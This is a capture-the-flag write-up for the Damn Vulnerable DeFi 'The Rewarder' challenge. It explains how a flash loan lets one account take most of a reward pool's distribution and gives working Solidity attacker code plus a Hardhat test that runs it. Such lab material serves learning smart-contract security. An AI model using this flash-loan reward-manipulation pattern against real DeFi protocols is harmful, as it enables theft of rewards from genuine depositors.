### [Contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/the-rewarder)

### Task 
>There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.

>Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!

>You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.

>By the way, rumours say a new pool has just launched. Isn’t it offering flash loans of DVT tokens?
### Observations

- The `RewarderPool` contract seems to have 100eth in rewards ready to divide by DVT depositors at equal ratio to the relative deposit size.

- The depositor at the end of the round will call `distributeRewards()` which multiplies the `amountDeposited` by `REWARDS`/`totalDeposits` ratio.

- This should be exploitable by calling that flashloan for a VAST amount of DVT at the end of the rewards round, dominating the rewards pool share.

- The `deposit()` function calls `distributeRewards()` so we can imediately `withdraw()` having received the majority of funds, in theory.

- Then payback flashloan within the same transaction.

### Steps
*Hack contract is attached in this repo*

- Create attacker contract to take maximum flashloan:

```

    //Takes flashloan, next attack is on `receivedFlashLoan()`
    function attack() public {
        require(msg.sender == owner, "Only Owner");

        uint256 maxLoanAmount = liquidityToken.balanceOf(address(flashPool));
        flashPool.flashLoan(maxLoanAmount);
    }

```

- On FL received, approve pool to spend my DVT, deposit all DVT to the pool, then withdraw, and pay back FL:

```
function receiveFlashLoan(uint256 amount) public {
        require(
            msg.sender == address(flashPool),
            "Only Flash Loan Pool can access"
        );
        // do things before paying back flashloan

        //approve the rewards pool to take my tokens when I deposit
        liquidityToken.approve(address(rewardPool), amount);

        //deposit to reward pool -> will call to distribute REWARDS
        rewardPool.deposit(amount);

        //withdraw from reward pool
        rewardPool.withdraw(amount);

        //repay flashloan
        SafeTransferLib.safeTransfer(
            address(liquidityToken),
            address(flashPool),
            amount
        );

        //send rewards to owner address
        uint256 rewards = rewardToken.balanceOf(address(this));
        SafeTransferLib.safeTransfer(address(rewardToken), owner, rewards);
    }
```

- execution code: Fast forward time to next round, deploy hack contract and call attack. (All as the player address):
```
it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // Advance time 5 days so that depositors can get rewards
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days

        const RewarderHack = await ethers.getContractFactory('TheRewarderHack', player);
        const rewarderHack = await RewarderHack.deploy(liquidityToken.address, rewarderPool.address, flashLoanPool.address, rewardToken.address);

        await rewarderHack.connect(player).attack();

    });
```
